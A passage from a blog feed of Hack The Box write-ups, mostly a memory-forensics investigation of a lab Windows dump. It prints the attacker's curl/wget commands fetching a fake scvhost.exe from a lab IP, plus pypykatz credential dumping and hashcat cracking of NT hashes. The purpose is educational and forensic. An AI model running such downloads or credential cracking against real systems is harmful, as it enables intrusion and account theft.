</span></span><span style="display:flex;"><span><span style="color:#bd93f9">11156</span>   <span style="color:#bd93f9">6772</span>    scvhost.exe     0xc40aa8cc8080  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">4</span>       True    2023-10-31 13:50:20.000000      2023-10-31 13:51:36.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1328</span>    <span style="color:#bd93f9">796</span>     Microsoft.Phot  0xc40aaa3f2080  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:54:21.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4660</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa636a080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:54:21.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6612</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aaaac3080  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:55:22.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9228</span>    <span style="color:#bd93f9">984</span>     audiodg.exe     0xc40aa6f6a300  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:56:08.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7664</span>    <span style="color:#bd93f9">1468</span>    TabTip.exe      0xc40aa73a4080  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:56:11.000000      2023-10-31 13:56:14.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7312</span>    <span style="color:#bd93f9">1424</span>    FTK Imager.exe  0xc40aad8de080  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">4</span>       True    2023-10-31 13:56:11.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3120</span>    <span style="color:#bd93f9">796</span>     dllhost.exe     0xc40aa51b2080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:57:17.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4956</span>    <span style="color:#bd93f9">5156</span>    SearchFilterHo  0xc40aa5a28080  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:59:18.000000      N/A     Disabled
</span></span></code></pre></div><p>And correlated this data with previous finding&rsquo;s process IDs 3360, 11048, 9880 and 6772. And the I did a <code>pstree</code> on PID 6772. Even then I couldn&rsquo;t see the process ID.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol3 -f memory_dump.vmem windows.pstree --pid <span style="color:#bd93f9">6772</span>       
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00               PDB scanning finished                        
</span></span><span style="display:flex;"><span>PID     PPID    ImageFileName   Offset<span style="color:#ff79c6">(</span>V<span style="color:#ff79c6">)</span>       Threads Handles SessionId       Wow64   CreateTime      ExitTime        Audit   Cmd     Path
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">472</span>     <span style="color:#bd93f9">384</span>     wininit.exe     0xc40aa484e080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:56.000000      N/A     <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\w</span>ininit.exe    wininit.exe C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\w</span>ininit.exe
</span></span><span style="display:flex;"><span>* <span style="color:#bd93f9">620</span>   <span style="color:#bd93f9">472</span>     services.exe    0xc40aa49a90c0  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:56.000000      N/A     <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\s</span>ervices.exe   C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\s</span>ervices.exe     C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\s</span>ervices.exe
</span></span><span style="display:flex;"><span>** <span style="color:#bd93f9">796</span>  <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa50ad280  <span style="color:#bd93f9">12</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\s</span>vchost.exe    C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\s</span>vchost.exe -k DcomLaunch -p     C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\s</span>vchost.exe
</span></span><span style="display:flex;"><span>*** <span style="color:#bd93f9">7812</span>        <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa8cc3080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:15.000000      N/A     <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\R</span>untimeBroker.exe  C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\R</span>untimeBroker.exe -Embedding C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\R</span>untimeBroker.exe
</span></span><span style="display:flex;"><span>**** <span style="color:#bd93f9">1020</span>       <span style="color:#bd93f9">7812</span>    winlogon.exe    0xc40aa768b080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:09.000000      N/A     <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\w</span>inlogon.exe   winlogon.exe C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\w</span>inlogon.exe
</span></span><span style="display:flex;"><span>***** <span style="color:#bd93f9">8788</span>      <span style="color:#bd93f9">1020</span>    userinit.exe    0xc40aa73c2440  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      2023-10-31 13:35:36.000000      <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\u</span>serinit.exe        -       -
</span></span><span style="display:flex;"><span>****** <span style="color:#bd93f9">1424</span>     <span style="color:#bd93f9">8788</span>    explorer.exe    0xc40aa8c11440  <span style="color:#bd93f9">87</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:35:12.000000      N/A     <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\e</span>xplorer.exe    C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\E</span>xplorer.EXE      C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\E</span>xplorer.EXE
</span></span><span style="display:flex;"><span>******* <span style="color:#bd93f9">6772</span>    <span style="color:#bd93f9">1424</span>    powershell.exe  0xc40aa9de7080  <span style="color:#bd93f9">11</span>      -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:42:21.000000      N/A     <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\W</span>indowsPowerShell<span style="color:#f1fa8c">\v</span>1.0<span style="color:#f1fa8c">\p</span>owershell.exe       <span style="color:#f1fa8c">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>     C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\W</span>indowsPowerShell<span style="color:#f1fa8c">\v</span>1.0<span style="color:#f1fa8c">\p</span>owershell.exe
</span></span><span style="display:flex;"><span>******** <span style="color:#bd93f9">11156</span>  <span style="color:#bd93f9">6772</span>    scvhost.exe     0xc40aa8cc8080  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">4</span>       True    2023-10-31 13:50:20.000000      2023-10-31 13:51:36.000000      <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\B</span>antingFG<span style="color:#f1fa8c">\D</span>ownloads<span style="color:#f1fa8c">\s</span>cvhost.exe        -       -
</span></span><span style="display:flex;"><span>******** <span style="color:#bd93f9">4532</span>   <span style="color:#bd93f9">6772</span>    conhost.exe     0xc40aaa8de4c0  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">4</span>       False   2023-10-31 13:42:22.000000      N/A     <span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume4<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\c</span>onhost.exe    <span style="color:#f1fa8c">\?</span>?<span style="color:#f1fa8c">\C</span>:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\c</span>onhost.exe 0x4      C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\c</span>onhost.exe
</span></span></code></pre></div><p>Now I found the process ID and process name. Please don&rsquo;t be stupid like me. Do a <code>pstree</code> and check for unusual/not-trusted-by-system directory for suspicious files. For example from a user&rsquo;s home directory like Downloads, Documents, etc. you get the gist. If followed till now you will have the answers for tasks up to 4.</p>
<p>For, task 5 I struggled heavily. I dumped all the <code>.evtx</code> file from the memory converted it to JSON and tried find the <code>4104</code> event for Powershell Script Block Text. What a disaster!</p>
<p>Dump all the file with the extension <code>.evtx</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol3 -f memory_dump.vmem windows.dumpfiles --filter <span style="color:#f1fa8c">&#34;.evtx</span>$<span style="color:#f1fa8c">&#34;</span>
</span></span></code></pre></div><p>After that if you try convert them using EvtxECmd tool it won&rsquo;t play nice. So, I batch renamed them in Linux the <code>Thunar</code> like file explorer gives you nice options to do this. Then, I reran the evtx parser and compiled a single JSON file. Then I did a lot of jq kung-fu didn&rsquo;t find the command but I was able to uncover what kind of protocol it used, so that was helpful.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ cat 20240621161500_EvtxECmd_Output.json | jq <span style="color:#f1fa8c">&#39;select(.EventId==4100)&#39;</span> | less
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PayloadData1&#34;</span>: <span style="color:#f1fa8c">&#34;Severity = Warning&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PayloadData2&#34;</span>: <span style="color:#f1fa8c">&#34;Command Name: Invoke-WebRequest&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PayloadData3&#34;</span>: <span style="color:#f1fa8c">&#34;CommandType: Cmdlet&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PayloadData4&#34;</span>: <span style="color:#f1fa8c">&#34;Script Name: &#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PayloadData5&#34;</span>: <span style="color:#f1fa8c">&#34;HostApplication: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;PayloadData6&#34;</span>: <span style="color:#f1fa8c">&#34;Host Name: ConsoleHost&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;UserName&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-UMNCBE7\\BantingFG&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;MapDescription&#34;</span>: <span style="color:#f1fa8c">&#34;Executing pipeline&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;ChunkNumber&#34;</span>: 3,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Computer&#34;</span>: <span style="color:#f1fa8c">&#34;DESKTOP-UMNCBE7&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Payload&#34;</span>: <span style="color:#f1fa8c">&#34;{\&#34;EventData\&#34;:{\&#34;Data\&#34;:[{\&#34;@Name\&#34;:\&#34;ContextInfo\&#34;,\&#34;#text\&#34;:\&#34;        Severity = Warning,         Host Name = ConsoleHost,         Host Version = 5.1.17763.316,         Host ID = 8fa103ce-0c44-43e0-ac8e-df87e2567d20,         Host Application = C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe,         Engine Version = 5.1.17763.316,         Runspace ID = 64229a85-901b-4b7a-9eab-fa74e87d4707,         Pipeline ID = 21,         Command Name = Invoke-WebRequest,         Command Type = Cmdlet,         Script Name = ,         Command Path = ,         Sequence Number = 15,         User = DESKTOP-UMNCBE7\\\\BantingFG,         Connected User = ,         Shell ID = Microsoft.PowerShell, \&#34;},{\&#34;@Name\&#34;:\&#34;UserData\&#34;},{\&#34;@Name\&#34;:\&#34;Payload\&#34;,\&#34;#text\&#34;:\&#34;Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer&#39;s first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. , Fully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand, \&#34;}]}}&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;UserId&#34;</span>: <span style="color:#f1fa8c">&#34;S-1-5-21-3466369480-1315555486-2413066615-1002&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Channel&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-PowerShell/Operational&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Provider&#34;</span>: <span style="color:#f1fa8c">&#34;Microsoft-Windows-PowerShell&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;EventId&#34;</span>: 4100,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;EventRecordId&#34;</span>: <span style="color:#f1fa8c">&#34;42&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;ProcessId&#34;</span>: 6772,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;ThreadId&#34;</span>: 10680,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Level&#34;</span>: <span style="color:#f1fa8c">&#34;Warning&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Keywords&#34;</span>: <span style="color:#f1fa8c">&#34;0x0&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SourceFile&#34;</span>: <span style="color:#f1fa8c">&#34;.\\powershell_events\\file.0xc40aab362c20.0xc40aab0eada0.SharedCacheMap.Microsoft-Windows-PowerShell%4Operational.evtx.vacb.evtx.evtx&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;ExtraDataOffset&#34;</span>: 0,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;HiddenRecord&#34;</span>: false,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;TimeCreated&#34;</span>: <span style="color:#f1fa8c">&#34;2023-10-31T13:43:12.1648343+00:00&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;RecordNumber&#34;</span>: <span style="color:#bd93f9">42</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>I searched for Invoke-WebRequest with the attacker IP couldn&rsquo;t found it until I dumped all the strings of the memdump and tried grep on &ldquo;httx://192.168.157.151&rdquo;.</p>
<p>Running strings on the memdump:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ strings memory_dump.vmem | grep <span style="color:#f1fa8c">&#34;http://192.168.157.151&#34;</span>                                          
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>33mhttp://192.168.157.151:8000/scvhost.exeee8000/scvhost.exenot
</span></span><span style="display:flex;"><span>curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span><span style="display:flex;"><span>wget http://192.168.157.151:8000/scvhost.exe
</span></span><span style="display:flex;"><span>curl http://192.168.157.151:8000/scvhost.exe
</span></span><span style="display:flex;"><span>curl -L -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span><span style="display:flex;"><span>curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span><span style="display:flex;"><span>curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span><span style="display:flex;"><span>curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span><span style="display:flex;"><span>del .<span style="color:#f1fa8c">\s</span>cvhost.exexe http://192.168.157.151:8000/scvhost.exeexeMessageDetails <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">}</span>mandErrorMessage<span style="color:#f1fa8c">&#34;) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">curl -L -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">curl -L -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">wget http://192.168.157.151:8000/scvhost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">curl http://192.168.157.151:8000/scvhost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">curl -L -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">curl -o scvhost.exe http://192.168.157.151:8000/scvhost.exe
</span></span></span></code></pre></div><p>One of them is the command the attacker ran to download the malware.</p>
<p>At this point I saved the <code>strings</code> dump to a file. And began searching for <code>331 Password required for</code> which is the default authentication failure message for FileZilla and mostly many of the FTP server or at least 530 error code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>(not logged in) (192.168.157.151)&gt; 331 Password required for admin
</span></span><span style="display:flex;"><span>(not logged in) (192.168.157.151)&gt; 331 Password required for kalilinux123
</span></span><span style="display:flex;"><span>(not logged in) (192.168.157.151)&gt; 331 Password required for kali
</span></span></code></pre></div><p>For task 7 we can use a plugin called <code>chromehistoryviewer</code> and get all the Browser history with a timeline in a CSV file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol -f memory_dump.vmem --profile<span style="color:#ff79c6">=</span>Win10x64_17763 chromehistory --output<span style="color:#ff79c6">=</span>csv --output-file<span style="color:#ff79c6">=</span>history.csv
</span></span></code></pre></div><p>From there we can find the last visited URL by the TA.</p>
<p>To get the password of the affected user (At first I thought FTP user ð), we can use a plugin called <code>pypykatz</code> it dumps the credentials from memory not just from registry hives, it does all.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol3 -f memory_dump.vmem pypykatz                       
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>ERROR    pypykatz    : Failed to prcess TSPKG package! Reason: Page Fault at entry 0x0 in table page directory
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>credtype        domainname      username        NThash  LMHash  SHAHash masterkey       masterkey<span style="color:#ff79c6">(</span>sha1<span style="color:#ff79c6">)</span> key_guid        password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msv     DESKTOP-UMNCBE7 Admin   3dbde697d71690a769204beb12283678                0d5399508427ce79556cda71918020c1e8d15b53
</span></span><span style="display:flex;"><span>msv     DESKTOP-UMNCBE7 BantingFG       5a4a40e43197cd4dfb7c72e691536e92                7df220b7ed7bca82d3e170731b6cd86587101192
</span></span><span style="display:flex;"><span>dpapi                                           e26a2d47a3e4a33400614daff0d5e6a061200de1abd4056b8b658b44e18f1d1f8101cc04c8e5315952edd9bf32ee44c05b0bc3d99053cf375ddec2414930b79a        d735c94c3064d338ef6e1a874780adfa4b4bfa41     21dfb24c-d9a1-4e46-bff2-ba98539b9768
</span></span><span style="display:flex;"><span>msv     DESKTOP-UMNCBE7 Admin   3dbde697d71690a769204beb12283678                0d5399508427ce79556cda71918020c1e8d15b53
</span></span><span style="display:flex;"><span>dpapi                                           34d138d82127c75b238d8f414e98b48358b3a8880f43e2212c3bb172c823fbf2424351ee8ddc9e407f3e46629a022f65c313005f7ac94d0f5c059aebcad0c125        3c950963ae990a1118b279d0bcfb3f11b743a49f     afc04938-bba9-4f5c-b9c3-e4b899cb27ee
</span></span><span style="display:flex;"><span>dpapi                                           d55ecb922b0fd16d9af227c265059dc46192abfbf5c89339d1c5a432be47b963d1355bfbcaf9016956f9ac16b8f42c8b2d934b8c43fbb22d54f2292d593f3ecb        f37d82960fd5a4c3feaa398fae970f4cb33a24b6     a7683077-63ed-4595-9bf2-e8f9d3bc2f3a
</span></span><span style="display:flex;"><span>msv     DESKTOP-UMNCBE7 Admin   3dbde697d71690a769204beb12283678                0d5399508427ce79556cda71918020c1e8d15b53
</span></span><span style="display:flex;"><span>dpapi                                           3d15d26f3532f6ca7567cc69cfa3e82507edea1ab0fcb4d8dbe87cc15c309e08cb16bfe596004904241d93b1c2631401dd49d150e9f47bdcf5b0429be90bc5c9        1dd83beebdd1a4cf6e8ac19d13ad0d84add78596     ddcc14de-a060-4863-ad1d-96fb7b555c99
</span></span><span style="display:flex;"><span>dpapi                                           784504bf11d0066d4663c9967856053b47980657e18b4909828c8d0d0f66d3a9866566446ead1eba2554413ce0ee591da2588270d12725a2a849960ffb226ab8        2f988aa590011bebf9dc9db3e18a053356e6fb16     9f5bd34d-3191-4b45-a5b7-68bc8336dbea
</span></span><span style="display:flex;"><span>dpapi                                           2cf5018d1e054a01d4b908668e7082b6be4ce334d4d73b1eea67bd821010ee1638e56e2b57b45959e8ad5d4bc11c20e8d3dc8c883bc44a3ea631ff55a615dbdd        72ae3ff66d9014848ddac0c0aa1d01b1ee7d08f9     3918288f-2eb4-4d79-ba4a-d325164ebd87
</span></span><span style="display:flex;"><span>dpapi                                           a479224d253b2e7d5b8f2e56f0a8c427e3c6edf4742540a61999759f290cf909c0baabd9027eddfcc660d4f52320c2a42c81affd652932b5968b3f98b1bb357f        09ff221cfa897a19b8065495501a4d61885518ed     e81493f9-1082-443b-8caf-e220f16e4ff5
</span></span><span style="display:flex;"><span>dpapi                                           5df8b07e65ba2d80a81f93bbdc9fde08f203a0d00fc4999e999179e10616d716a954d6486408a11ec61ab3ad39af93a1e3a4d5652ad0251582f6878450f705a6        8d09e135aa13a8edbe3d94e0978c5c81ecd01071     8f367e09-0da5-4303-b810-8aef131b9b4c
</span></span></code></pre></div><p>Using the NT hash from the <code>BantingFG</code> I used hashcat to crack it. I mean I did it for the machines never for a Sherlock that was a first.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ hashcat mellitus.hash ~/SecLists/Passwords/Leaked-Databases/rockyou.txt -m <span style="color:#bd93f9">1000</span> --show
</span></span><span style="display:flex;"><span>3dbde697d71690a769204beb12283678:123
</span></span><span style="display:flex;"><span>5a4a40e43197cd4dfb7c72e691536e92:flowers123
</span></span></code></pre></div><p>Task 8 and 9 looks more like CTF challenges. To find the answers I read this article on <a href="https://ctftime.org/writeup/23198">CTFTime</a> and it gave me some hints.</p>
<p>First I dumped the <code>mspaint.exe</code>&rsquo;s memory using <code>memdump</code> plugin.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol -f memory_dump.vmem --profile<span style="color:#ff79c6">=</span>Win10x64_17763 memdump -p <span style="color:#bd93f9">5116</span> --dump-dir .           
</span></span><span style="display:flex;"><span>Volatility Foundation Volatility Framework 2.6.1
</span></span><span style="display:flex;"><span>************************************************************************
</span></span><span style="display:flex;"><span>Writing mspaint.exe <span style="color:#ff79c6">[</span>  5116<span style="color:#ff79c6">]</span> to 5116.dmp
</span></span></code></pre></div><p>Then I renamed the <code>5116.dmp</code> to <code>5116.data</code> because of an Issue with gimp. Gimp does not load raw data without <code>.data</code> extension apparently.</p>
<p>Opening raw dump data with gimp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ gimp 5116.data
</span></span></code></pre></div><p>I adjusted the height and width and most importantly the offset.
<img src="images/20240623072546.png" alt="alt text"></p>
<p>Before writing this writeup I found one in the yellow band. Now it is in Cyan band. Don&rsquo;t know what&rsquo;s happening here.</p>
<h3 id="summary">Summary</h3>
<p>It was tougher than other sherlocks I have solved. But, it was a medium difficulty rated on HTB. This sherlock introduces a little bit CTF-ish style. I enjoyed  it.</p>
]]></description></item><item><title>HTB Machine Editorial</title><link>https://hshakilst.github.io/posts/htb-machines/editorial/</link><pubDate>Sun, 16 Jun 2024 05:12:20 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/editorial/</guid><description><![CDATA[<h1 id="editorial---htbhttpsapphacktheboxcommachineseditorial">Editorial - <a href="https://app.hackthebox.com/machines/Editorial">HTB</a></h1>
<p><img src="images/banner.png" alt="alt text"></p>
<h3 id="recon">Recon</h3>
<p>Let&rsquo;s start off by Nmap&rsquo;ing the target.</p>
<h4 id="nmap">Nmap</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span># Nmap 7.94SVN scan initiated Tue Jun 18 07:58:25 2024 as: nmap -vvv -p 22,80 -sCV -oN nmap 10.129.49.40
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report for editorial.htb (10.129.49.40)
</span></span><span style="display:flex;"><span>Host is up, received conn-refused (0.37s latency).
</span></span><span style="display:flex;"><span>Scanned at 2024-06-18 07:58:25 +02 for 27s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT STATE SERVICE REASON VERSION
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
